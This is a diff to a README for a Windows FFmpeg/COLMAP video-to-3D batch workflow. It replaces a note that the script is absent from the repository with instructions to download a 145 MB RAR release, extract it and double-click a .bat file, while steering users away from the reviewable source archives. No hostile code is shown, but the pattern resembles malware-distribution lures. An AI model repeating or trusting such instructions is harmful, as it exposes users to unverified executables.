@@ -4,7 +4,20 @@
 
 Motion Tracker Automated is a Windows batch workflow that processes videos into extracted frames, estimated camera poses, and sparse 3D scene data. It connects FFmpeg frame extraction with COLMAP feature extraction, sequential matching, reconstruction, and text export.
 
-> **Repository status:** This README documents the existing local `batch_reconstruct.bat` implementation. The script and external tools are not currently included in this repository; cloning it alone does not provide a runnable workflow.
+[**Download Motion Tracker v1**](https://github.com/Uplinkdevv/Motion-Tracker-automated/releases/download/Release/automated.tracker.rar) · [Release notes](https://github.com/Uplinkdevv/Motion-Tracker-automated/releases/tag/Release)
+
+## Download and quick start
+
+The full project is distributed through **GitHub Releases**. Download the attached `automated.tracker.rar` archive (approximately **145 MB**) from [Motion Tracker v1](https://github.com/Uplinkdevv/Motion-Tracker-automated/releases/tag/Release).
+
+1. Download `automated.tracker.rar` using the link above.
+2. Extract the entire archive to your Desktop using an archive utility that supports RAR files.
+3. Open the extracted project folder and keep its numbered folders together.
+4. Put your video files in `02 VIDEOS`.
+5. Open `05 SCRIPT` and double-click `batch_reconstruct.bat`.
+6. Find each video's results in `04 SCENES`.
+
+The release instructions describe setup as downloading and extracting the project. Use the attached **RAR asset**; GitHub's automatic **Source code (zip)** and **Source code (tar.gz)** downloads contain the repository snapshot, not the uploaded project package.
 
 ## Features
 
@@ -30,13 +43,14 @@ The script resolves paths relative to its own location, so the workflow uses the
 
 ## Requirements
 
-For the local workflow, you need:
+To use the release, you need:
 
 - **Windows**, with Command Prompt support for `.bat` files.
-- **[FFmpeg](https://ffmpeg.org/download.html)**, provided as a Windows static build.
-- **[COLMAP](https://github.com/colmap/colmap/releases)**, with its Windows libraries and Qt plugins.
-- A COLMAP build that supports the command-line options listed below and GPU feature extraction.
+- An archive utility that can extract `.rar` files.
+- GPU support compatible with the packaged COLMAP build for feature extraction.
 - Enough free storage for extracted frames, the database, and reconstruction outputs.
+
+The workflow uses **FFmpeg** and **COLMAP** from the extracted project folders. If either tool is missing after extraction, check that the full release archive was extracted. For a manual setup, obtain [FFmpeg](https://ffmpeg.org/download.html) and [COLMAP](https://github.com/colmap/colmap/releases), preserving the folder layout below and using a COLMAP build compatible with the listed options.
 
 The script enables GPU feature extraction and CPU feature matching. It does not provide an automatic CPU fallback for feature extraction.
 
@@ -65,9 +79,9 @@ Keep the COLMAP distribution's supporting libraries and plugin folders intact. T
 
 ## Usage
 
-These steps apply when you already have the batch script and the required tools:
+After extracting the release archive:
 
-1. Arrange the folders as shown above.
+1. Open the extracted project folder and confirm the numbered folders remain together.
 2. Put your input videos in `02 VIDEOS`.
 3. Double-click `05 SCRIPT/batch_reconstruct.bat`, or run it from Command Prompt:
    ```bat
@@ -145,7 +159,7 @@ The script does not detect changed input videos. To process revised footage inde
 
 This workflow reconstructs camera motion and sparse scene geometry from video. It does not implement real-time object tracking, dense reconstruction, mesh generation, or a rendered scene viewer.
 
-Results depend on the input footage and successful COLMAP reconstruction. The documentation is based on inspection of the batch script, not a new runtime test or accuracy benchmark.
+Results depend on the input footage and successful COLMAP reconstruction. The workflow details are based on inspection of the batch script; download instructions follow the published Motion Tracker v1 release. The release archive has not been independently runtime-tested for this documentation update.
 
 ## Credits
 
